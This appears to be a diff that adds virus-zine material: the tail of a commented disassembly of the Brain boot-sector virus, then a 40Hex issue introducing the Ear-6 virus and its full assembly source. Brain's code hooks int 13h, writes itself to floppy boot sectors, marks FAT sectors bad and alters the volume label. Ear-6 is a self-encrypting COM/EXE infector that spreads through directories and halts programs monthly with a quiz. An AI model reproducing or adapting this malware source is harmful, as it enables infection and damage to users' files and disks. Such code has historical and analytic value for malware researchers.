+                rep     movsb
+                push    es
+                mov     ax,200h
+                push    ax
+                retf                            ; return to old boot sector
+
+readdisk:
+                push    cx
+                push    bx
+                mov     cx,4                    ; Try 4 times
+
+tryread:
+                push    cx
+                mov     dh,ds:[7C00h+offset curhead]
+                mov     dl,0                    ; Read sector from default
+                mov     cx,ds:[7C00h+offset cursector]
+                mov     ax,201h                 ; Disk to memory at es:bx
+                int     13h
+                jnc     readOK
+                mov     ah,0                    ; Reset disk
+                int     13h                     ; (force read track 0)
+                pop     cx
+                loop    tryread
+
+                int     18h                     ; ROM basic on failure
+readOK:
+                pop     cx
+                pop     bx
+                pop     cx
+                retn
+
+calcnext:
+                mov     al,byte ptr ds:[7C00h+offset cursector]
+                inc     al
+                mov     byte ptr ds:[7C00h+offset cursector],al
+                cmp     al,0Ah
+                jne     donecalc
+                mov     byte ptr ds:[7C00h+offset cursector],1
+                mov     al,ds:[7C00h+offset curhead]
+                inc     al
+                mov     ds:[7C00h+offset curhead],al
+                cmp     al,2
+                jne     donecalc
+                mov     byte ptr ds:[7C00h+offset curhead],0
+                inc     byte ptr ds:[7C00h+offset cursector+1]
+donecalc:
+                retn
+
+; the following is a collection of garbage bytes
+                db       00h, 00h, 00h, 00h, 32h,0E3h
+                db       23h, 4Dh, 59h,0F4h,0A1h, 82h
+                db      0BCh,0C3h, 12h, 00h, 7Eh, 12h
+                db      0CDh, 21h,0A2h, 3Ch, 5Fh
+a_data          dw      050Ch
+; Second part of the virus begins here
+                jmp     short entersecondpart
+                db      '(c) 1986 Brain & Amjads (pvt) Ltd ',0
+readcounter     db      4                       ; keep track of # reads
+curdrive        db      0
+int13flag       db      0
+
+entersecondpart:
+                mov     cs:readcounter,1Fh
+                xor     ax,ax
+                mov     ds,ax                   ; ds -> interrupt table
+                mov     ax,ds:[13h*4]
+                mov     ds:[6Dh*4],ax
+                mov     ax,ds:[13h*4+2]
+                mov     ds:[6Dh*4+2],ax
+                mov     ax,offset int13         ; 276h
+                mov     ds:[13h*4],ax
+                mov     ax,cs
+                mov     ds:[13h*4+2],ax
+                mov     cx,4                    ; 4 tries
+                xor     ax,ax
+                mov     es,ax                   ; es -> interrupt table
+
+tryreadbootsector:
+                push    cx
+                mov     dh,cs:firsthead
+                mov     dl,0
+                mov     cx,cs:firstsector
+                mov     ax,201h                 ; read from default disk
+                mov     bx,7C00h
+                int     6Dh                     ; int 13h
+                jnc     readbootOK
+                mov     ah,0
+                int     6Dh                     ; int 13h
+                pop     cx
+                loop    tryreadbootsector
+
+                int     18h                     ; ROM basic on failure
+readbootOK:                                     ; return control to
+                                                ; original boot sector
+;*              jmp     far ptr 0000:7C00h
+                db      0EAh, 00h, 7Ch, 00h, 00h
+                nop                             ; MASM NOP!!!
+int13:
+                sti
+                cmp     ah,2                    ; if not read request,
+                jne     doint13                 ; do not go further
+                cmp     dl,2                    ; if after second floppy,
+                ja      doint13                 ; do not go further
+                cmp     ch,0                    ; if not reading boot sector,
+                jne     regularread             ; go handle as usual
+                cmp     dh,0                    ; if boot sector,
+                je      readboot                ; do I<-/>/\|> stuff
+regularread:
+                dec     cs:readcounter          ; Infect after 4 reads
+                jnz     doint13                 ; If counter still OK, don't
+                                                ; do anything else
+                jmp     short readboot          ; Otherwise, try to infect
+doint13:
+                jmp     exitint13h
+readboot:
+; FINISH THIS!
+                mov     cs:int13flag,0          ; clear flag
+                mov     cs:readcounter,4        ; reset counter
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                mov     cs:curdrive,dl
+                mov     cx,4
+
+tryreadbootblock:
+                push    cx
+                mov     ah,0                    ; Reset disk
+                int     6Dh
+                jc      errorreadingbootblock   ; Try again
+                mov     dh,0
+                mov     cx,1
+                mov     bx,offset readbuffer    ; buffer @ 6BEh
+                push    es
+                mov     ax,cs
+                mov     es,ax
+                mov     ax,201h
+                int     6Dh                     ; Read boot sector
+                pop     es
+                jnc     continuestuff           ; continue if no error
+errorreadingbootblock:
+                pop     cx
+                loop    tryreadbootblock
+
+                jmp     short resetdisk         ; too many failures
+                nop
+continuestuff:
+                pop     cx                      ; get system id in boot block
+                mov     ax,word ptr cs:[offset readbuffer+4]
+                cmp     ax,1234h                ; already infected?
+                jne     dodisk                  ; if not, infect it
+                mov     cs:int13flag,1          ; flag prev. infection
+                jmp     short noreset
+dodisk:
+                push    ds
+                push    es
+                mov     ax,cs
+                mov     ds,ax
+                mov     es,ax
+                push    si
+                call    writevirus              ; infect the disk
+                jc      failme                  ; exit on failure
+                mov     cs:int13flag,2          ; flag success
+                call    changeroot              ; manipulate volume label
+failme:
+                pop     si
+                pop     es
+                pop     ds
+                jnc     noreset                 ; don't reset on success
+resetdisk:
+                mov     ah,0                    ; reset disk
+                int     6Dh                     ; int 13h
+noreset:
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+                cmp     cx,1
+                jne     exitint13h
+                cmp     dh,0
+                jne     exitint13h
+                cmp     cs:int13flag,1          ; already infected?
+                jne     wasntinfected           ; if wasn't, go elsewhere
+                mov     cx,word ptr cs:[offset readbuffer+7]
+                mov     dx,word ptr cs:[offset readbuffer+5]
+                mov     dl,cs:curdrive          ; otherwise, read real
+                jmp     short exitint13h        ; boot sector
+wasntinfected:
+                cmp     cs:int13flag,2          ; successful infection?
+                jne     exitint13h              ; if not, just do call
+                mov     cx,cs:firstsector
+                mov     dh,cs:firsthead
+exitint13h:
+                int     6Dh                     ; int 13h
+                retf    2
+                db      15 dup (0)
+
+FATManip:                                       ; returns al as error code
+                jmp     short delvedeeper
+                nop
+FATManipreadcounter dw      3
+                db      ' (c) 1986 Brain & Amjads (pvt) Ltd'
+delvedeeper:
+                call    readFAT                 ; Get FAT ID byte
+                mov     ax,word ptr ds:[offset readbuffer]
+                cmp     ax,0FFFDh               ; is it 360K disk?
+                je      is360Kdisk              ; continue if so
+                mov     al,3                    ; al=3 == not good disk
+                stc                             ; flag error
+                retn                            ; and exit
+is360Kdisk:
+                mov     cx,37h
+                mov     FATManipreadcounter,0   ; none found yet
+checknextsector:
+                call    FATentry12bit           ; get entry in FAT
+                cmp     ax,0                    ; unused?
+                jne     notunused
+                inc     FATManipreadcounter     ; one more found unused
+                cmp     FATManipreadcounter,3   ; If need more,
+                jne     tryanother              ;  go there
+                jmp     short markembad         ; found 3 consecutive
+                nop                             ; empty sectors
+notunused:
+                mov     FATManipreadcounter,0   ; must start over
+tryanother:
+                inc     cx                      ; try next sector
+                cmp     cx,163h                 ; end of disk?
+                jne     checknextsector         ; if not, continue
+                mov     al,1                    ; al=1 == none empty
+                stc                             ; Indicate error
+                retn
+markembad:
+                mov     dl,3                    ; 3 times
+markanotherbad:
+                call    markbad12bit
+                dec     cx
+                dec     dl
+                jnz     markanotherbad
+                inc     cx
+                call    calc1sttrack
+                call    writeFAT                ; update FAT
+                mov     al,0                    ; al=0 == ok
+                clc                             ; indicate success
+                retn
+
+markbad12bit:
+                push    cx
+                push    dx
+                mov     si,offset readbuffer    ; si -> buffer
+                mov     al,cl
+                shr     al,1
+                jc      low_12                  ; low bits
+                call    clus2offset12bit
+                mov     ax,[bx+si]              ; get FAT entry
+                and     ax,0F000h               ; mark it bad
+                or      ax,0FF7h
+                jmp     short putitback         ; and put it back
+                nop
+low_12:
+                call    clus2offset12bit
+                mov     ax,[bx+si]              ; get FAT entry
+                and     ax,0Fh                  ; mark it bad
+                or      ax,0FF70h
+putitback:
+                mov     [bx+si],ax              ; replace FAT entry
+                mov     word ptr ds:[400h][bx+si],ax ; in two places
+                pop     dx
+                pop     cx
+                retn
+
+FATentry12bit:
+                push    cx
+                mov     si,offset readbuffer    ; si->buffer
+                mov     al,cl
+                shr     al,1
+; Part 3 of the virus starts here
+                jc      want_high_12
+                call    clus2offset12bit
+                mov     ax,[bx+si]
+                and     ax,0FFFh
+                jmp     short exitFATentry12bit
+                nop
+want_high_12:
+                call    clus2offset12bit        ; xxxxxxxxxxxx0000
+                mov     ax,[bx+si]              ; ^^^^^^^^^^^^wanted
+                and     ax,0FFF0h               ; mask wanted bits
+                mov     cl,4                    ; and move to correct
+                shr     ax,cl                   ; position
+exitFATentry12bit:
+                pop     cx
+                retn
+
+clus2offset12bit:
+                push    dx
+                mov     ax,3
+                mul     cx
+                shr     ax,1                    ; ax = cx*1.5
+                mov     bx,ax
+                pop     dx
+                retn
+
+readFAT:
+                mov     ah,2                    ; read
+                call    FAT_IO
+                retn
+
+writeFAT:
+                mov     ah,3                    ; write
+                call    FAT_IO
+                retn
+
+FAT_IO:
+                mov     cx,4                    ; try four times
+FAT_IOLoop:
+                push    cx
+                push    ax
+                mov     ah,0                    ; reset disk
+                int     6Dh                     ; int 13h
+                pop     ax
+                jc      tryFAT_IOagain
+                mov     bx,offset readbuffer
+                mov     al,4                    ; 4 sectors
+                mov     dh,0                    ; head 0
+                mov     dl,curdrive
+                mov     cx,2                    ; sector 2
+                push    ax                      ; (FAT)
+                int     6Dh                     ; int 13h
+                pop     ax
+                jnc     exitFAT_IO
+tryFAT_IOagain:
+                pop     cx
+                loop    FAT_IOLoop
+
+                pop     ax
+                pop     ax
+                mov     al,2
+                stc                             ; mark error
+                retn
+exitFAT_IO:
+                pop     cx
+                retn
+
+calc1sttrack:
+                push    cx
+                sub     cx,2
+                shl     cx,1                    ; 2 sectors/cluster
+                add     cx,0Ch                  ; start of data area
+                mov     ax,cx                   ; ax = sector
+                mov     cl,12h                  ; 4096
+                div     cl                      ; ax/4096 = al rem ah
+                mov     byte ptr firstsector+1,al
+                mov     firsthead,0
+                inc     ah
+                cmp     ah,9                    ; past track 9?
+                jbe     notpasttrack9           ; nope, we are ok
+                sub     ah,9                    ; otherwise, adjust
+                mov     firsthead,1
+notpasttrack9:
+                mov     byte ptr firstsector,ah
+                pop     cx
+                retn
+
+                db      0, 0, 0, 0, 0, 0
+r_or_w_root     db      3
+entrycount      dw      35h
+
+tempsave1       dw      303h
+tempsave2       dw      0EBEh
+tempsave3       dw      1
+tempsave4       dw      100h
+                db      0E0h,0D8h, 9Dh,0D7h,0E0h, 9Fh
+                db       8Dh, 98h, 9Fh, 8Eh,0E0h
+                db      ' (c) ashar $'
+changeroot:
+                call    readroot                ; read in root directory
+                jc      donotchangeroot
+                push    di
+                call    changevolume            ; change volume label
+                pop     di
+                jc      donotchangeroot
+                call    writeroot               ; write back new root dir
+donotchangeroot:
+                retn
+; The following is just garbage bytes
+                db      0BBh, 9Bh, 04h,0B9h, 0Bh
+                db      0,8Ah,7,0F6h,0D8h,88h,4,46h,43h
+                db      0E2h,0F6h,0B0h,8,88h,4,0F8h,0C3h
+                db      0C6h, 06h
+
+changevolume:
+                mov     entrycount,6Ch
+                mov     si,offset readbuffer+40h; 3nd dir entry
+                mov     tempsave1,dx
+                mov     ax,entrycount           ; 6Ch
+                shr     ax,1
+                mov     tempsave3,ax            ; 36h
+                shr     ax,1
+                mov     tempsave2,ax            ; 1Bh
+                xchg    ax,cx
+                and     cl,43h                  ; cx = 3
+                mov     di,tempsave2
+                add     di,1E3h                 ; di = 01FE
+findlabel:
+                mov     al,[si]
+                cmp     al,0
+                je      dolabel                 ; no mo entries
+                mov     al,[si+0Bh]             ; attribute byte
+                and     al,8                    ; volume label?
+                cmp     al,8                    ; yes?
+                je      dolabel                 ; then change it!
+                add     si,20h                  ; go to next directory entry
+                dec     entrycount
+                jnz     findlabel               ; loop back
+                stc                             ; Error!
+                retn
+                db      8Bh
+dolabel:
+                mov     bx,[di]                 ; offset a_data
+                xor     bx,tempsave3            ; bx = 53Ah
+                mov     tempsave3,si            ; si->direntry
+                cli
+                mov     ax,ss
+                mov     tempsave1,ax
+                mov     tempsave2,sp
+                mov     ax,cs
+                mov     ss,ax
+                mov     sp,tempsave3
+                add     sp,0Ch                  ;->reserved area
+                mov     cl,51h
+                add     dx,444Ch
+                mov     di,2555h
+                mov     cx,0C03h
+                repe    cmpsw
+                mov     ax,0B46h
+                mov     cx,3
+                rol     ax,cl                   ; ax = 5A30h
+                mov     tempsave3,ax
+                mov     cx,5
+                mov     dx,8
+                sub     tempsave3,5210h         ; 820h
+                push    tempsave3               ; store attributes/reserved
+; I haven't commented the remainder of this procedure.
+; It basically changes the volume label to read "(c) Brain"
+
+; Comment mode OFF
+
+dowhatever:
+                mov     ah,[bx]                 ; 5a3h
+                inc     bx
+                mov     dl,ah
+                shl     dl,1
+                jc      dowhatever
+searchstuff:
+                mov     dl,[bx]                 ; dl=C2h
+                inc     bx                      ; bx=53Eh
+                mov     al,dl
+                shl     dl,1
+                jc      searchstuff
+                add     ax,1D1Dh
+                push    ax
+                inc     tempsave3
+                db       73h, 01h               ; jnc $+3
+                db      0EAh,0E2h,0E1h, 8Bh, 26h; jmp 268B:E1E2
+                xchg    bp,ax
+                add     al,0A1h
+                xchg    bx,ax
+                add     al,8Eh
+                sar     bl,1
+                add     dh,[bp+si]
+                clc
+                ret
+                ;db       95h, 04h,0A1h, 93h, 04h, 8Eh
+                ;db      0D0h,0FBh, 02h, 32h,0F8h,0C3h
+
+; Comment mode ON
+
+readroot:
+                mov     r_or_w_root,2           ; set action code
+                jmp     short do_rw_root        ; easier to do w/
+                nop                             ; mov ah, 2
+writeroot:
+                mov     r_or_w_root,3
+                jmp     short do_rw_root        ; this is somewhat useless
+                nop
+do_rw_root:
+                mov     dh,0                    ; head 0
+                mov     dl,curdrive
+                mov     cx,6                    ; sector 6
+                mov     ah,r_or_w_root
+                mov     al,4                    ; 4 sectors
+                mov     bx,offset readbuffer
+                call    doint13h
+                jc      exit_rw_root            ; quit on error
+                mov     cx,1
+                mov     dh,1                    ; head 1
+                mov     ah,r_or_w_root
+                mov     al,3
+                add     bx,800h
+                call    doint13h
+
+exit_rw_root:
+                retn
+
+doint13h:
+                mov     tempsave1,ax
+                mov     tempsave2,bx
+                mov     tempsave3,cx
+                mov     tempsave4,dx
+                mov     cx,4
+
+doint13hloop:
+                push    cx
+                mov     ah,0                    ; Reset disk
+                int     6Dh
+                jc      errordoingint13h
+                mov     ax,tempsave1
+                mov     bx,tempsave2
+                mov     cx,tempsave3
+                mov     dx,tempsave4
+                int     6Dh                     ; int 13h
+                jnc     int13hsuccess
+errordoingint13h:
+                pop     cx
+                loop    doint13hloop
+
+                stc                             ; indicate error
+                retn
+int13hsuccess:
+                pop     cx
+                retn
+
+                db      0, 0, 0
+; Part 4 of the virus starts here
+tempstorecx     dw      3
+readwritecurrentdata    dw      301h
+
+writevirus:
+                call    FATManip
+                jc      exitwritevirus
+                mov     cursector,1
+                mov     curhead,0
+                mov     bx,offset readbuffer
+                call    readcurrent
+                mov     bx,offset readbuffer
+                mov     ax,firstsector
+                mov     cursector,ax
+                mov     ah,firsthead
+                mov     curhead,ah
+                call    writecurrent
+                call    calcnextsector
+                mov     cx,5
+                mov     bx,200h
+writeanothersector:
+                mov     tempstorecx,cx
+                call    writecurrent
+                call    calcnextsector
+                add     bx,200h
+                mov     cx,tempstorecx
+                loop    writeanothersector
+
+                mov     curhead,0
+                mov     cursector,1
+                mov     bx,0
+                call    writecurrent
+                clc                             ; indicate success
+exitwritevirus:
+                retn
+
+
+readcurrent:
+                mov     readwritecurrentdata,201h
+                jmp     short doreadwrite
+                nop
+writecurrent:
+                mov     readwritecurrentdata,301h
+                jmp     short doreadwrite       ; This is pointless.
+                nop
+doreadwrite:
+                push    bx
+                mov     cx,4
+
+tryreadwriteagain:
+                push    cx
+                mov     dh,curhead
+                mov     dl,curdrive
+                mov     cx,cursector
+                mov     ax,readwritecurrentdata ; read or write?
+                int     6Dh                     ; int 13h
+                jnc     readwritesuccessful
+                mov     ah,0                    ; reset disk
+                int     6Dh                     ; int 13h
+                pop     cx
+                loop    tryreadwriteagain
+
+                pop     bx
+                pop     bx
+                stc                             ; Indicate error
+                retn
+readwritesuccessful:
+                pop     cx
+                pop     bx
+                retn
+
+
+calcnextsector:
+                inc     byte ptr cursector      ; next sector
+                cmp     byte ptr cursector,0Ah
+                jne     donecalculate           ; finished calculations
+                mov     byte ptr cursector,1    ; clear sector #
+                inc     curhead                 ; and go to next head
+                cmp     curhead,2               ; if not too large,
+                jne     donecalculate           ; we are done
+                mov     curhead,0               ; otherwise clear head #
+                inc     byte ptr cursector+1    ; and advance cylinder
+donecalculate:
+                retn
+
+                db       64h, 74h, 61h
+
+; read buffer starts here
+; insert your favorite boot block below...
+readbuffer:
+brain           ends
+                end
+40Hex Number 8 Volume 2 Issue 4                                       File 009
+
+                  -=PHALCON/SKISM=- Ear-6 Virus
+
+    The Ear-6 is a parasitic, non-resident, .COM & .EXE infector.  It
+infects 5 files everytime it is run.  It will traverse towards the root
+directory if fewer than 5 files are found.  We have no clue as to what
+the 'AUX error' that Patti talks about.  But then again, Patti isn't
+sure as to who she is, let alone an accurate discription on one of our
+virii.  On activation (1st of any month), it plays ear quiz with
+victim.  Failure to answer the question will result in program
+termination.
+                                        -) Gheap
+
+-----------------------------------------------------------------------------
+; [Ear-6]
+
+; El virus de oreja y o¡do seis
+; Fue escrito por Dark Angel de PHALCON/SKISM
+; Yo (el  ngel oscuro) escrib¡ este programa hace muchas semanas.
+; No deba modificar este programa y da a otras personas COMO SI
+; estar  el suyo.
+
+; ¨D¢nde est  mi llama, mama?
+
+;                       diccionarito
+; espa¤ol       ingl‚s                   magnitud      size
+; abre          open                     mango         handle
+; aprueba       pass (a test)            m scara       mask
+; atras         back                     mensaje       message
+; azado         random                   mes           month
+; busca         find                     mont¢n        heap
+; cierra        close                    oreja, o¡do   ear
+; cifra         code, encrypt, decrypt   pila          stack
+; codo          pointer                  pregunta      question
+; corto         terse, short             primer        first
+; empieza       begin                    remendar      patch
+; escriba       write                    renuncia      reject
+; espa¤ol       ingl‚s                   respuesta     answer
+; fecha         date                     salta         exit
+; ficha         file                     siguiente     following, next
+; ¡ndice        table                    suspende      fail (a test)
+; ¨le gusta?    do you like?             termina       end
+; longitud      length                   virus         virus (!)
+
+.model tiny
+.code
+org     100h
+
+longitud_del_virus = TerminaVir - EmpezarVir
+longitud_del_escribir = offset termina_escribir - offset escribir
+
+id = 'GH'                                       ; Representa el l¡der de
+                                                ; PHALCON/SKISM, Garbageheap
+Empezar:  db      0e9h, 0, 0                    ; jmp EmpezarVir
+
+EmpezarVir:
+shwing:
+remendar1:
+        mov     bx, offset EmpezarCifra
+remendar2:
+        mov     cx, ((longitud_del_virus + 1) / 2)
+hacia_atras:    ; atr s
+        db      2eh
+remendar3:
+        db      81h, 37h, 0, 0                  ; xor word ptr cs:[bx], 0
+        add     bx, 2
+        loop    hacia_atras
+EmpezarCifra:
+
+        call    siguiente                       ; Es estupido, pero es corto
+siguiente:
+        pop     bp
+        sub     bp, offset siguiente
+
+        mov     byte ptr [bp+numinf], 0
+
+        cld                                     ; No es necessario, pero
+                                                ; ¨por qu‚ no?
+        cmp     sp, id
+        jz      SoyEXE
+SoyCOM: mov     di, 100h
+        push    di
+        lea     si, [bp+Primer3]
+        movsb
+        jmp     short SoyNada
+SoyEXE: push    ds
+        push    es
+        push    cs
+        push    cs
+        pop     ds
+        pop     es
+
+        lea     di, [bp+EXE_Donde_JMP]  ; el CS:IP original de la ficha
+        lea     si, [bp+EXE_Donde_JMP2] ; infectada
+        movsw
+        movsw
+        movsw
+
+        jmp     short SoyNada
+
+NombreDelVirus  db  0,'[Ear-6]',0               ; En ingl‚s, ­por supuesto!
+NombreDelAutor  db  'Dark Angel',0
+
+SoyNada:
+        movsw
+
+        mov     ah, 1ah                         ; Esindicece un DTA nuevo
+        lea     dx, [bp+offset nuevoDTA]        ; porque no quiere destruir
+        int     21h                             ; el DTA original
+
+        mov     ax, word ptr [bp+remendar1+1]
+        mov     word ptr [bp+tempo], ax
+
+        mov     ah, 47h                         ; Obtiene el directorio
+        xor     dl, dl                          ; presente
+        lea     si, [bp+diroriginal]
+        int     21h
+
+looper:
+        lea     dx, [bp+offset mascara1]        ; "m scara", no "mascara"
+        call    infectar_mascara                ; pero no es possible usar
+                                                ; acentos en MASM/TASM.
+                                                ; ­Qu‚ l stima!
+                                                ; mascara1 es '*.EXE',0
+        lea     dx, [bp+offset mascara2]        ; mascara2 es '*.COM',0
+        call    infectar_mascara                ; infecta las fichas de COM
+
+        cmp     byte ptr [bp+numinf], 5         ; ¨Ha infectada cinco fichas?
+        jg      saltar                          ; Si es verdad, no necesita
+                                                ; busca m s fichas.
+        mov     ah, 3bh                         ; Cambia el directorio al
+        lea     dx, [bp+puntos]                 ; directorio anterior
+        int     21h                             ; ('..', 'punto punto')
+        jnc     looper
+
+saltar: lea     dx, [bp+backslash]              ; Cambia el directorio al
+        mov     ah, 3bh                         ; directorio terminado.
+        int     21h
+
+        mov     ah, 2ah                         ; Activa el primer de
+        int     21h                             ; cada mes
+        cmp     dl, 1                           ; Si no es el primer,
+        jnz     saltarahora                     ; ­saltar ahora! (duh-o)
+
+        mov     ah, 2ch                         ; ¨Qu‚ hora es?
+        int     21h
+
+        cmp     dl, 85                          ; 85% probabilidad de
+        jg      saltarahora                     ; activaci¢n
+
+        and     dx, 7                           ; Un n£mero quasi-azado
+        shl     dl, 1                           ; Usalo para determinar
+        mov     bx, bp                          ; que preguntar  la virus
+        add     bx, dx
+        mov     dx, word ptr [bx+indice]        ; ¡ndice para el examencito
+        add     dx, bp
+        inc     dx
+        push    dx                              ; Salva el codo al pregunta
+
+        mov     ah, 9                           ; Escriba el primer parte de
+        lea     dx, [bp+mensaje]                ; la pregunta
+        int     21h
+
+        pop     dx                              ; Escriba el parte de la oreja
+        int     21h                             ; o el o¡do
+        dec     dx
+        push    dx                              ; Salva la respuesta correcta
+
+        lea     dx, [bp+secciones]              ; Escriba los secciones de la
+        int     21h                             ; oreja y el o¡do
+
+trataotrarespuesta:
+        mov     ah, 7                           ; Obtiene la respuesta de la
+        int     21h                             ; "v¡ctima"
+        cmp     al, '1'                         ; Necesita una respuesta de
+        jl      trataotrarespuesta              ; uno hasta tres
+        cmp     al, '3'                         ; Renuncia otras respuestas
+        jg      trataotrarespuesta
+
+        int     29h                             ; Escriba la respuesta
+
+        pop     bx                              ; El codo al respuesta
+                                                ; correcta
+        mov     ah, 9                           ; Prepara a escribir un
+                                                ; mensaje
+        cmp     al, byte ptr [bx]               ; ¨Es correcta?
+        jz      saltarapidamente                ; l aprueba el examencito.
+                                                ; Pues, salta r pidamente.
+        lea     dx, [bp+suspendido]             ; Lo siento, pero ­Ud. no
+        int     21h                             ; aprueba el examencito f cil!
+
+        mov     ah, 4ch                         ; Estudie m s y el programa
+        jmp     quite                           ; permitir  a Ud a continuar.
+
+saltarapidamente:
+        lea     dx, [bp+aprueba]
+        int     21h
+saltarahora:
+        mov     ah, 1ah                         ; Restaura el DTA original
+        mov     dx, 80h
+quite:
+        cmp     sp, id - 4                      ; ¨Es EXE o COM?
+        jz      vuelvaEXE
+vuelvaCOM:
+        int     21h                             ; Restaura el DTA y vuelva
+        retn                                    ; a la ficha original de COM
+
+vuelvaEXE:
+        pop     es
+        pop     ds                              ; ds -> PSP
+
+        int     21h
+
+        mov     ax, es
+        add     ax, 10h                         ; Ajusta para el PSP
+        add     word ptr cs:[bp+EXE_Donde_JMP+2], ax
+        cli
+        add     ax, word ptr cs:[bp+PilaOriginal+2]
+        mov     ss, ax
+        mov     sp, word ptr cs:[bp+PilaOriginal]
+        sti
+        db      0eah                            ; JMP FAR PTR SEG:OFF
+EXE_Donde_JMP dd 0
+PilaOriginal  dd 0
+
+EXE_Donde_JMP2  dd 0
+PilaOriginal2   dd 0
+
+infectar_mascara:
+        mov     ah, 4eh                         ; Busca la ficha primera
+        mov     cx, 7                           ; Cada atributo
+brb_brb:
+        int     21h
+        jc      hasta_la_vista_bebe             ; No la busca
+
+        xor     al, al
+        call    abrir                           ; Abre la ficha
+
+        mov     ah, 3fh
+        mov     cx, 1ah
+        lea     dx, [bp+buffer]
+        int     21h
+
+        mov     ah, 3eh                         ; Cierra la ficha
+        int     21h
+
+        lea     si,[bp+nuevoDTA+15h]            ; Salva cosas sobre la ficha
+        lea     di,[bp+f_atrib]                 ; Por ejemplo, la fecha de
+        mov     cx, 9                           ; creaci¢n
+        rep     movsb
+
+        cmp     word ptr [bp+buffer], 'ZM'      ; ¨Es EXE o COM?
+        jz      buscaEXE
+buscaCOM:
+        mov     ax, word ptr [bp+f_long]        ; ¨Cuan grande es la ficha?
+        sub     ax, longitud_del_virus + 3      ; Adjusta para el JMP
+        cmp     ax, word ptr [bp+buffer+1]      ; ¨Ya es infectada?
+        jnz     infecta_mi_burro                ; "infect my ass"
+        jmp     short BuscaMas
+buscaEXE:
+        cmp     word ptr [bp+buffer+10h], id
+        jnz     infecta_mi_burro
+BuscaMas:
+        mov     ah, 4fh                         ; Busca otra ficha...
+        jmp     short brb_brb
+hasta_la_vista_bebe:                            ; ¨Le gusta Arnold?
+        ret
+
+infecta_mi_burro:
+        ; AX = longitud de la ficha infectada
+        lea     si, [bp+buffer]
+
+        cmp     word ptr [si], 'ZM'
+        jz      InfectaEXE
+InfectaCOM:
+        push    ax
+
+        mov     cx, word ptr [bp+tempo]
+        mov     word ptr [bp+remendar1+1], cx
+
+        lea     di, [bp+Primer3]
+        movsb
+        push    si
+        movsw
+
+        mov     byte ptr [bp+buffer], 0e9h
+        pop     di
+        add     ax, longitud_del_virus
+        stosw
+
+        mov     cx, 3
+        jmp     short   TerminaInfeccion
+InfectaEXE:
+        les     ax, [si+14h]                    ; Salva el original empieza
+        mov     word ptr [bp+EXE_Donde_JMP2], ax; CS:IP de la ficha infectada
+        mov     word ptr [bp+EXE_Donde_JMP2+2], es
+
+        les     ax, [si+0Eh]                    ; Salva la original locaci¢n
+        mov     word ptr [bp+PilaOriginal2], es ; de la pila
+        mov     word ptr [bp+PilaOriginal2+2], ax
+
+        mov     ax, word ptr [si + 8]
+        mov     cl, 4
+        shl     ax, cl
+        xchg    ax, bx
+
+        les     ax, [bp+offset nuevoDTA+26]
+        mov     dx, es
+        push    ax
+        push    dx
+
+        sub     ax, bx
+        sbb     dx, 0
+
+        mov     cx, 10h
+        div     cx
+
+        mov     word ptr [si+14h], dx           ; Nuevo empieza CS:IP
+        mov     word ptr [si+16h], ax
+
+        mov     cl, 4
+        shr     dx, cl
+        add     ax, dx
+        mov     word ptr [si+0Eh], ax           ; y SS:SP
+        mov     word ptr [si+10h], id
+
+        pop     dx                              ; Restaura el magnitud de
+        pop     ax                              ; la ficha
+
+        add     ax, longitud_del_virus          ; A¤ada el magnitud del virus
+        adc     dx, 0
+        mov     cl, 9
+        push    ax
+        shr     ax, cl
+        ror     dx, cl
+        stc
+        adc     dx, ax
+        pop     ax
+        and     ah, 1
+
+        mov     word ptr [si+4], dx             ; Nuevo magnitud de la ficha
+        mov     word ptr [si+2], ax
+
+        push    cs
+        pop     es
+
+        mov     ax, word ptr [si+14h]
+        sub     ax, longitud_del_virus + offset Empezarvir
+        push    ax
+
+        mov     cx, 1ah
+TerminaInfeccion:
+        mov     al, 2
+        call    abrir
+
+        mov     ah, 40h
+        lea     dx, [bp+buffer]
+        int     21h
+
+        mov     ax, 4202h
+        xor     cx, cx
+        cwd                                     ; xor dx,dx
+        int     21h
+
+        mov     ah, 2ch                         ; N£meros azados en CX y DX
+        int     21h
+        mov     word ptr [bp+remendar3+2], cx   ; Es el nuevo n£mero de la
+                                                ; cifra
+        and     cx, 31                          ; Pone un n£mero azado para el
+        add     cx, ((longitud_del_virus + 1) / 2); magnitud de la ficha.  Por
+                                                ; eso, los scanners necesitan
+        mov     word ptr [bp+remendar2+1], cx   ; usar "wildcards"
+        lea     di, [bp+tempstore]
+        mov     al, 53h                         ; push bx
+        stosb                                   ; (no destruir el mango de la
+                                                ;  ficha)
+        lea     si, [bp+shwing]                 ; Copia las instrucciones
+        push    si                              ; para formar la cifra
+        mov     cx, longitud_de_la_cifra
+        push    cx
+        rep     movsb
+
+        mov     al, 5bh                         ; pop bx
+        stosb                                   ; (recuerda mango de la ficha)
+
+        lea     si, [bp+escribir]               ; Copia las instrucciones
+        mov     cx, longitud_del_escribir       ; para a¤ada el virus a la
+        rep     movsb                           ; ficha
+
+        mov     al, 53h                         ; push bx
+        stosb
+
+        pop     cx                              ; Copia las instrucciones
+        pop     si                              ; para invalidar la cifra
+        rep     movsb
+        mov     ax, 0c35bh                      ; pop bx, retn
+        stosw
+
+        pop     ax
+
+        ; Codo del comienzo de la cifra
+        add     ax, offset EmpezarCifra + longitud_del_virus
+        mov     word ptr [bp+remendar1+1], ax
+
+        call    antes_del_tempstore
+
+        mov     ax, 5701h                       ; BX = mango de la ficha
+        mov     dx, word ptr [bp+f_fecha]
+        mov     cx, word ptr [bp+f_hora]
+        int     21h                             ; Restaura fecha y hora
+
+        mov     ah, 3eh
+        int     21h
+
+        xor     ch, ch
+        mov     cl, byte ptr [bp+f_atrib]
+        mov     ax, 4301h
+        lea     dx, [bp+offset nuevoDTA + 30]     ; Busca un ficha en el DTA
+        int     21h
+
+        inc     byte ptr [bp+numinf]
+
+        jmp     BuscaMas
+
+Primer3  db 0CDh, 20h, 0
+puntos   db '..',0
+mascara1 db '*.EXE',0
+mascara2 db '*.COM',0
+
+abrir:  mov     ah, 3dh                         ; Abrir un ficha
+        lea     dx, [bp+nuevoDTA+30]            ; Nombre de la ficha es en
+        int     21h                             ; el DTA
+        xchg    ax, bx
+        ret
+
+indice  dw      offset oreja1, offset oreja2, offset oreja3, offset oreja4
+        dw      offset oreja5, offset oreja6, offset oreja4, offset oreja1
+oreja1  db      '1','Auditory Canal$'
+oreja2  db      '1','Lobe$'
+oreja3  db      '2','Anvil$'
+oreja4  db      '2','Eustachian Tube$'
+oreja5  db      '3','Auditory Nerve$'
+oreja6  db      '3','Cochlea$'
+
